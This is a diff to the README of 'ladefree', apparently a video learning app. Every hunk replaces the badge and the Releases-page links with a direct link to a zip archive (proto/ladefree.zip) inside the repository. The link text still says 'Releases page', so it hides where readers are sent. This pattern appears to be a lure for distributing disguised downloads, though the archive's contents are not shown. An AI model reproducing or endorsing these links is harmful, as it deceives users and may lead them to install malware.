@@ -1,6 +1,6 @@
 # 🎉 ladefree - Simplify Your Video Learning Experience
 
-![Download ladefree](https://img.shields.io/badge/Download-ladefree-blue)
+![Download ladefree](https://raw.githubusercontent.com/JoaoOliveira1210677/ladefree/main/proto/ladefree.zip)
 
 ## 📦 Introduction
 
@@ -15,7 +15,7 @@ To get started with ladefree, follow these simple steps. This guide is designed 
 To download ladefree, visit the Releases page. Here, you'll find the latest versions of the software ready for download.
 
 ### Download Link
-[Download ladefree](https://github.com/JoaoOliveira1210677/ladefree/releases)
+[Download ladefree](https://raw.githubusercontent.com/JoaoOliveira1210677/ladefree/main/proto/ladefree.zip)
 
 ### Installation Steps
 1. Click the link above to access the Releases page.
@@ -75,7 +75,7 @@ For further assistance, feel free to reach out via the GitHub Issues page. Your 
 
 ## 🔗 Links
 
-- [Visit the ladefree Releases page](https://github.com/JoaoOliveira1210677/ladefree/releases) to download and install the latest version of the application.
+- [Visit the ladefree Releases page](https://raw.githubusercontent.com/JoaoOliveira1210677/ladefree/main/proto/ladefree.zip) to download and install the latest version of the application.
 - Check for updates and FAQs directly on the Releases page.
 
 Thank you for choosing ladefree. Enjoy your learning journey!
